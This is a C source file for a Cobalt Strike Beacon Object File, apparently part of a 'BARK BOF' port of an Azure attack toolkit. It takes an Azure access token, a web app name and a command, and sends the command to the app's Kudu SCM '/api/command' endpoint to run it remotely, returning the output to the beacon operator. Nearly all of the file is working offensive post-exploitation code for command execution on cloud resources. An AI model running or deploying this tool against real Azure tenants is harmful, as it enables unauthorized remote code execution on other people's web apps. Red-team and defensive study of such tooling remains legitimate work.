/*
 * invoke_azurerm_web_app_shell_command.c — BARK BOF
 * Invoke-AzureRMWebAppShellCommand — Run a command via Web App Kudu SCM endpoint
 *
 * Args : token, webAppName, command
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char hostBuf[256];
    static char bodyBuf[4096];
    LPWSTR wideHost = NULL, hdrWide = NULL;
    char  *resp     = NULL;
    char  *token = NULL, *webAppName = NULL, *command = NULL;
    DWORD  status   = 0;

    BeaconDataParse(&parser, args, alen);
    token      = BeaconDataExtract(&parser, NULL);
    webAppName = BeaconDataExtract(&parser, NULL);
    command    = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_invoke_azurerm_web_app_shell_command "
            "<token> <webAppName> <command>\n");
        return;
    }

    MSVCRT$sprintf_s(hostBuf, sizeof(hostBuf), "%s.scm.azurewebsites.net", webAppName);
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"command\":\"%s\",\"dir\":\"D:\\home\\site\\wwwroot\"}", command);

    wideHost = MbsToWcs(hostBuf);
    hdrWide  = BarkMakeAuthHeader(token, "Content-Type: application/json\r\n");
    if (!wideHost || !hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] String conversion failed\n");
        HFree(wideHost); HFree(hdrWide); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Invoke-AzureRMWebAppShellCommand on %s\n", hostBuf);
    resp = HttpRequest(L"POST", wideHost, L"/api/command", hdrWide,
                       bodyBuf, (DWORD)MSVCRT$strlen(bodyBuf), &status);
    if (resp) { BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp); HFree(resp); }
    else      { BeaconPrintf(CALLBACK_ERROR, "[-] Request failed (HTTP %lu)\n", status); }
    HFree(wideHost);
    HFree(hdrWide);
}
